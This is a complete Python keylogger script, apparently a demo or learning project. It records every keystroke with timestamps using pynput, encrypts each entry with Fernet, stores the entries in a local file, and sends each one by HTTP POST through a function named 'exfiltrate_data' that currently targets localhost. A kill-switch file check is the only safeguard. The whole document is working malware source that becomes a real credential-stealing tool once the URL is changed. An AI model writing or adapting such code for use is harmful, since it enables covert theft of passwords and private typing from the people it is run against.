from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import requests
import os
import sys

# --------- Load Encryption Key ---------
with open("secret.key", "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)

# --------- Check Kill Switch ---------
def check_kill_switch():
    if os.path.exists("kill.switch"):
        print("Kill switch activated. Exiting...")
        sys.exit()

# --------- Log Key Press and Encrypt ---------
def on_press(key):
    check_kill_switch()
    try:
        pressed_key = f'{key.char}'
    except AttributeError:
        pressed_key = f'{key}'

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} : {pressed_key}"
    
    # Encrypt log entry
    encrypted_data = fernet.encrypt(log_entry.encode())

    # Store encrypted log locally
    with open("keylog.enc", "ab") as log_file:
        log_file.write(encrypted_data + b"\n")

    print(f"Logged: {pressed_key}")

    # Simulate sending encrypted log to localhost server
    exfiltrate_data(encrypted_data)

# --------- Exfiltrate (Simulate Send to localhost:8000) ---------
def exfiltrate_data(encrypted_data):
    url = "http://localhost:8000"
    try:
        response = requests.post(url, data=encrypted_data)
        print("Exfiltrated:", response.status_code)
    except Exception as e:
        print("Server not available:", e)

# --------- Start Listening ---------
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
